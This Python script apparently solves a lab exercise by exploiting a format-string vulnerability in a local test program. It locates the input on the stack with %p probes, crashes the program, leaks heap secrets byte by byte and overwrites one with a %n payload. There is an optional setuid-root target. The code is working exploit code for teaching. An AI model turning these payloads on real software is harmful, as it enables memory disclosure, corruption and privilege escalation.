#!/usr/bin/python
import pexpect
import signal
import struct
import tty
from time import sleep
import binascii

SIGNALS_TO_NAMES_DICT = dict((getattr(signal, n), n) \
    for n in dir(signal) if n.startswith('SIG') and '_' not in n )

use_setuid_version = False
if use_setuid_version:
    program_name = "./formatstr-no-int-root"
else:
    program_name = "./formatstring-no-int"

print "Using program: " + program_name
print

def consume_line(p):
    return p.readline()[:-1] #last two chars \r\n

def read_and_print(p):
    line = consume_line(p)
    print line
    return line

def run(silent=False):
    p = pexpect.spawn(program_name)

    if not silent:
        read_and_print(p)
        read_and_print(p)
        line = read_and_print(p)
        read_and_print(p)
    else:
        consume_line(p)
        consume_line(p)
        line = consume_line(p)
        consume_line(p)

    secret_addr_str = line[line.find("0x")+2:line.find(" (on heap)")]

    if secret_addr_str[0] == ' ':
        secret_addr_str = secret_addr_str[1:]

    secret0_addr = int(secret_addr_str, 16)
    secret1_addr = secret0_addr + 4

    if not silent: #enter a string
        read_and_print(p)
    else:
        consume_line(p)

    return p, secret0_addr, secret1_addr

def inject(payload, silent=False):
    if not silent:
        print "Sending payload: "  + repr(payload)

    p.send(payload)

    if not silent: #output of sendline
        read_and_print(p)
    else:
        consume_line(p)


# search for stack position of string input (spsi)
print "---------------------------------------------------------------------"
print "Preparation: search for stack position of string input..."
str_sig = "RIPP"
str_sig_hex = "0x" + "".join("{:02x}".format(ord(c)) for c in str_sig[::-1])
print "Signature: \"" + str_sig + "\", hex: " + str(str_sig_hex)
p, secret0_addr, secret1_addr = run(False)
inject("RIPPAAAA%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p\n", False)
line = read_and_print(p) #payload result
spsi = 1 + line.split(",").index(str(str_sig_hex))
print "Stack position of string input: " + str(spsi)
p.close()
print

#crash program
print "---------------------------------------------------------------------"
print "Part 1a) Crash the program"
p, _, _ = run(0)
inject("%x%s\n")
p.close()
print "Program signal: " + str(p.signalstatus) + " (" + SIGNALS_TO_NAMES_DICT[p.signalstatus] + ")"
print

#use found positions to manipulate data
print "---------------------------------------------------------------------"
print "Part 1b) Read secret[1]"
print "Sending multiple payloads to read one byte at a time..."
for i in range(4):
    p, _, secret1_addr = run(True)
    secret1_addr = secret1_addr + i
    secret1_hex_le = struct.pack('<I', secret1_addr)
    # print "secret[1] address big endian:    " + hex(secret1_addr)
    # print "secret[1] address little endian: 0x" + secret1_hex_le.encode('hex')
    sleep(0.1)  #delay needed to make setraw work
    tty.setraw(p.fileno())
    inject(secret1_hex_le + "<%" + str(spsi) + "$.1s>\n", False)
    # read_and_print(p) #payload result
    p.close()

#write arbitrary data into secrets[1]
print "---------------------------------------------------------------------"
write_val = 0xde
print "Part 1c/d) Write a value (" + '0x{:02x}'.format(write_val) + ") to secret[1]"
p, _, secret1_addr = run(True)
secret1_hex_le = struct.pack('<I', secret1_addr)
# print "secret[1] address big endian:    " + hex(secret1_addr)
# print "secret[1] address little endian: 0x" + secret1_hex_le.encode('hex')
sleep(0.1)  #delay needed to make setraw work
tty.setraw(p.fileno())
inject(secret1_hex_le + "%" + str(spsi) + "$" + str(write_val - len(secret1_hex_le)) + ".0s%" + str(spsi) + "$n\n", False)
p.close()